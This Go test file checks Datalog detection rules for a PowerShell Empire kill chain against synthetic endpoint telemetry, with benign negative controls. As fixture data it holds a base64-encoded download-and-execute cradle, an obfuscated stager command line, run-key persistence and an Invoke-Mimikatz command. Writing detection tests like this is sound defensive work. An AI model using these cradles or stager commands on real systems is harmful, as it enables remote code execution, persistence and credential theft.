package optc_test

import (
	"bytes"
	"compress/gzip"
	"context"
	"embed"
	"encoding/base64"
	"encoding/json"
	"io/fs"
	"testing"
	"testing/fstest"
	"unicode/utf16"

	"gopkg.in/yaml.v3"
	"swdunlop.dev/pkg/datalog"
	"swdunlop.dev/pkg/datalog/jsonfacts"
	"swdunlop.dev/pkg/datalog/seminaive"
	"swdunlop.dev/pkg/datalog/syntax"
)

// The real OpTC slice is 2.3 GB and cannot be committed (see README.md),
// so these tests run optc.yaml and rules.dl against a synthetic eCAR
// slice that exercises every stage of the day-1 kill chain -- stager
// launch, child spawn, remote-thread injection, C2 beaconing, payload
// drop, run-key persistence, task creation, shell auditing -- plus
// negative controls that must NOT be attributed: a benign process with
// an external flow, an internal-destination flow from a tainted
// process, and a benign run-key write.

//go:embed optc.yaml
//go:embed rules.dl
var content embed.FS

const (
	host     = "TestHost.systemia.com"
	c2IP     = "132.197.158.98" // external: outside every matcher CIDR
	attacker = "TEST\\alice"
)

// encodedCradle is a canonically-cased download cradle as an
// -EncodedCommand payload (UTF-16LE base64), so base64_utf16le_contains
// fires. Real Empire case-randomizes and evades that matcher -- the
// stacked-plaintext-tell stager rule is what catches it; see rules.dl.
func encodedCradle() string {
	src := "IEX (New-Object Net.WebClient).DownloadString('http://x/a')"
	var raw bytes.Buffer
	for _, u := range utf16.Encode([]rune(src)) {
		raw.WriteByte(byte(u))
		raw.WriteByte(byte(u >> 8))
	}
	return base64.StdEncoding.EncodeToString(raw.Bytes())
}

type ecarRecord struct {
	Hostname   string         `json:"hostname"`
	Object     string         `json:"object"`
	Action     string         `json:"action"`
	ActorID    string         `json:"actorID"`
	ObjectID   string         `json:"objectID"`
	PID        int            `json:"pid"`
	PPID       int            `json:"ppid"`
	Principal  string         `json:"principal"`
	Timestamp  string         `json:"timestamp"`
	Properties map[string]any `json:"properties"`
}

func rec(object, action, actor, objectID string, props map[string]any) ecarRecord {
	return ecarRecord{
		Hostname: host, Object: object, Action: action,
		ActorID: actor, ObjectID: objectID,
		PID: 100, PPID: 90, Principal: attacker,
		Timestamp:  "2019-09-23T11:00:00.000-04:00",
		Properties: props,
	}
}

// syntheticSlice builds the eCAR records. Process UUIDs: S-1 is the
// stager, S-2 its child, V-1 an injection victim, B-1 benign.
func syntheticSlice() []ecarRecord {
	ps := "C:\\W\\powershell.exe"
	return []ecarRecord{
		// Stager: two distinct plaintext tells (-nop, -enc) plus an
		// encoded cradle -- both stager_launch rules fire.
		rec("PROCESS", "CREATE", "P-0", "S-1", map[string]any{
			"image_path": ps, "parent_image_path": "C:\\W\\cmd.exe",
			"command_line": "powershell -noP -sta -w 1 -enc " + encodedCradle(),
			"user":         attacker,
		}),
		// Child of the stager: tainted by descent.
		rec("PROCESS", "CREATE", "S-1", "S-2", map[string]any{
			"image_path": ps, "parent_image_path": ps,
			"command_line": "powershell", "user": attacker,
		}),
		// Benign process: must never be attributed.
		rec("PROCESS", "CREATE", "P-0", "B-1", map[string]any{
			"image_path": "C:\\W\\notepad.exe", "parent_image_path": "C:\\W\\explorer.exe",
			"command_line": "notepad.exe", "user": "TEST\\bob",
		}),
		// C2 beacon from the child to the external address.
		rec("FLOW", "START", "S-2", "F-1", map[string]any{
			"image_path": ps, "direction": "outbound",
			"src_ip": "142.20.56.202", "src_port": "5001",
			"dest_ip": c2IP, "dest_port": "80", "l4protocol": "6",
		}),
		// Internal-destination flow from the child: cidr_match covers
		// 142.20/16, so this must NOT become external_flow.
		rec("FLOW", "START", "S-2", "F-3", map[string]any{
			"image_path": ps, "direction": "outbound",
			"src_ip": "142.20.56.202", "src_port": "5003",
			"dest_ip": "142.20.61.130", "dest_port": "445", "l4protocol": "6",
		}),
		// Benign process talking external: external_flow yes, c2_flow no.
		rec("FLOW", "START", "B-1", "F-4", map[string]any{
			"image_path": "C:\\W\\notepad.exe", "direction": "outbound",
			"src_ip": "142.20.56.202", "src_port": "5004",
			"dest_ip": "8.8.8.8", "dest_port": "443", "l4protocol": "6",
		}),
		// Injection: stager creates a thread in victim V-1.
		rec("THREAD", "REMOTE_CREATE", "S-1", "T-1", map[string]any{
			"src_pid": "100", "tgt_pid": "200", "tgt_pid_uuid": "V-1",
			"image_path": ps,
		}),
		// The victim beacons too: tainted via injection, not descent.
		rec("FLOW", "START", "V-1", "F-5", map[string]any{
			"image_path": "C:\\W\\svchost.exe", "direction": "outbound",
			"src_ip": "142.20.56.202", "src_port": "5005",
			"dest_ip": c2IP, "dest_port": "443", "l4protocol": "6",
		}),
		// Script drop by the child.
		rec("FILE", "WRITE", "S-2", "FI-1", map[string]any{
			"image_path": ps, "file_path": "C:\\Users\\alice\\evil.ps1",
		}),
		// Run-key persistence written by the injected victim.
		rec("REGISTRY", "EDIT", "V-1", "R-1", map[string]any{
			"image_path": "C:\\W\\svchost.exe",
			"key":        "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
			"value":      "Updater", "data": "C:\\Users\\alice\\evil.ps1",
		}),
		// Scheduled-task persistence by the child.
		rec("TASK", "CREATE", "S-2", "TK-1", map[string]any{
			"image_path": "C:\\W\\schtasks.exe",
			"task_name":  "\\Updater", "user_name": attacker,
		}),
		// Shell auditing catches what the implant ran.
		rec("SHELL", "COMMAND", "S-1", "SH-1", map[string]any{
			"image_path": ps, "payload": "Invoke-Mimikatz",
			"context_info": "Host Application = powershell",
		}),
		// Benign run-key write: ci_contains fires on the key, but
		// empire_autorun must not, because B-1 is untainted.
		rec("REGISTRY", "EDIT", "B-1", "R-2", map[string]any{
			"image_path": "C:\\W\\notepad.exe",
			"key":        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
			"value":      "Benign", "data": "x",
		}),
	}
}

// loadConfig parses optc.yaml the same way cmd/datalog does: YAML to
// any, through JSON, into jsonfacts.Config -- so anchors resolve and
// the x-ecar-mappings key is ignored.
func loadConfig(t *testing.T) *jsonfacts.Config {
	t.Helper()
	data, err := fs.ReadFile(content, "optc.yaml")
	if err != nil {
		t.Fatal(err)
	}
	var raw any
	if err := yaml.Unmarshal(data, &raw); err != nil {
		t.Fatal(err)
	}
	data, err = json.Marshal(raw)
	if err != nil {
		t.Fatal(err)
	}
	var cfg jsonfacts.Config
	if err := json.Unmarshal(data, &cfg); err != nil {
		t.Fatal(err)
	}
	return &cfg
}

// buildDataFS gzips the synthetic slice into the first source file the
// config names; the remaining sources get empty gzips.
func buildDataFS(t *testing.T, cfg *jsonfacts.Config) fstest.MapFS {
	t.Helper()
	if len(cfg.Sources) == 0 {
		t.Fatal("optc.yaml declares no sources")
	}
	dataFS := fstest.MapFS{}
	for i, src := range cfg.Sources {
		var buf bytes.Buffer
		zw := gzip.NewWriter(&buf)
		if i == 0 {
			enc := json.NewEncoder(zw)
			for _, r := range syntheticSlice() {
				if err := enc.Encode(r); err != nil {
					t.Fatal(err)
				}
			}
		}
		if err := zw.Close(); err != nil {
			t.Fatal(err)
		}
		dataFS[src.File] = &fstest.MapFile{Data: buf.Bytes()}
	}
	return dataFS
}

// termSet collects the String() form of one column of a predicate.
func termSet(db datalog.Database, pred string, arity, col int) map[string]int {
	set := map[string]int{}
	for row := range db.Facts(pred, arity) {
		set[row[col].String()]++
	}
	return set
}

// q renders a string the way String terms stringify, for termSet keys.
func q(s string) string { return datalog.String(s).String() }

func TestLoadSyntheticFacts(t *testing.T) {
	cfg := loadConfig(t)
	db, err := cfg.LoadFS(buildDataFS(t, cfg))
	if err != nil {
		t.Fatal(err)
	}

	expected := map[string]struct{ arity, count int }{
		"proc_create":   {10, 3},
		"flow":          {11, 4},
		"file_event":    {7, 1},
		"remote_thread": {7, 1},
		"registry":      {9, 2},
		"task":          {10, 1},
		"shell_command": {7, 1},
	}
	for pred, want := range expected {
		got := 0
		for range db.Facts(pred, want.arity) {
			got++
		}
		if got != want.count {
			t.Errorf("%s/%d: got %d facts, want %d", pred, want.arity, got, want.count)
		}
	}

	// Matcher-derived predicates must fire on the synthetic values.
	for _, mc := range []struct {
		pred  string
		arity int
	}{
		{"ci_wd_contains", 2},          // plaintext stager tells
		{"base64_utf16le_contains", 2}, // canonically-cased encoded cradle
		{"ci_ends_with", 2},            // .ps1 drop
		{"ci_contains", 2},             // run-key writes (incl. the benign one)
		{"cidr_match", 2},              // internal 142.20/16 destinations
	} {
		count := 0
		for range db.Facts(mc.pred, mc.arity) {
			count++
		}
		t.Logf("%s/%d: %d facts", mc.pred, mc.arity, count)
		if count == 0 {
			t.Errorf("expected %s facts, got none", mc.pred)
		}
	}
}

func TestEmpireKillChain(t *testing.T) {
	cfg := loadConfig(t)
	db, err := cfg.LoadFS(buildDataFS(t, cfg))
	if err != nil {
		t.Fatal(err)
	}

	rulesData, err := fs.ReadFile(content, "rules.dl")
	if err != nil {
		t.Fatal(err)
	}
	rs, err := syntax.ParseAll(string(rulesData))
	if err != nil {
		t.Fatal(err)
	}
	tr, err := seminaive.New().Compile(rs)
	if err != nil {
		t.Fatal(err)
	}
	output, err := tr.Transform(context.Background(), db)
	if err != nil {
		t.Fatal(err)
	}

	// Exactly one stager, S-1, launched by the attacker.
	stagers := termSet(output, "stager_launch", 6, 1)
	if len(stagers) != 1 || stagers[q("S-1")] == 0 {
		t.Errorf("stager_launch: want exactly {S-1}, got %v", stagers)
	}

	// Taint is exactly {S-1, S-2, V-1}: descent AND injection, no benign.
	taint := termSet(output, "empire_proc", 2, 1)
	for _, want := range []string{"S-1", "S-2", "V-1"} {
		if taint[q(want)] == 0 {
			t.Errorf("empire_proc: missing %s", want)
		}
	}
	if taint[q("B-1")] != 0 {
		t.Error("empire_proc: benign B-1 was tainted")
	}
	if len(taint) != 3 {
		t.Errorf("empire_proc: want 3 processes, got %v", taint)
	}

	// external_flow keeps 8.8.8.8 (benign but external) and the C2,
	// and must exclude the internal 142.20.61.130 destination.
	ext := termSet(output, "external_flow", 6, 3)
	if ext[q("142.20.61.130")] != 0 {
		t.Error("external_flow: internal destination leaked through cidr negation")
	}
	if ext[q("8.8.8.8")] == 0 || ext[q(c2IP)] == 0 {
		t.Errorf("external_flow: want 8.8.8.8 and %s, got %v", c2IP, ext)
	}

	// c2_flow is attributed: only the C2 address, never notepad's 8.8.8.8.
	c2 := termSet(output, "c2_flow", 5, 2)
	if len(c2) != 1 || c2[q(c2IP)] == 0 {
		t.Errorf("c2_flow: want exactly {%s}, got %v", c2IP, c2)
	}

	// One injection event; the drop, run-key, and task are attributed;
	// the benign run-key write is not.
	if n := len(termSet(output, "empire_injection", 5, 3)); n != 1 {
		t.Errorf("empire_injection: want 1 target, got %d", n)
	}
	drops := termSet(output, "empire_drop", 4, 2)
	if drops[q("C:\\Users\\alice\\evil.ps1")] == 0 {
		t.Errorf("empire_drop: missing evil.ps1, got %v", drops)
	}
	autorun := termSet(output, "empire_autorun", 5, 2)
	if len(autorun) != 1 || autorun[q("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run")] == 0 {
		t.Errorf("empire_autorun: want only the V-1 run key, got %v", autorun)
	}
	tasks := termSet(output, "empire_task", 5, 2)
	if len(tasks) != 1 || tasks[q("\\Updater")] == 0 {
		t.Errorf("empire_task: want {\\Updater}, got %v", tasks)
	}
	shell := termSet(output, "empire_shell", 4, 2)
	if len(shell) != 1 || shell[q("Invoke-Mimikatz")] == 0 {
		t.Errorf("empire_shell: want {Invoke-Mimikatz}, got %v", shell)
	}

	// The roll-up: kill chain on host, attributed to the attacker.
	kcUsers := termSet(output, "empire_kill_chain", 4, 1)
	if len(kcUsers) != 1 || kcUsers[q(attacker)] == 0 {
		t.Errorf("empire_kill_chain: want user %s, got %v", attacker, kcUsers)
	}
	hosts := termSet(output, "compromised_host", 1, 0)
	if len(hosts) != 1 || hosts[q(host)] == 0 {
		t.Errorf("compromised_host: want {%s}, got %v", host, hosts)
	}
}
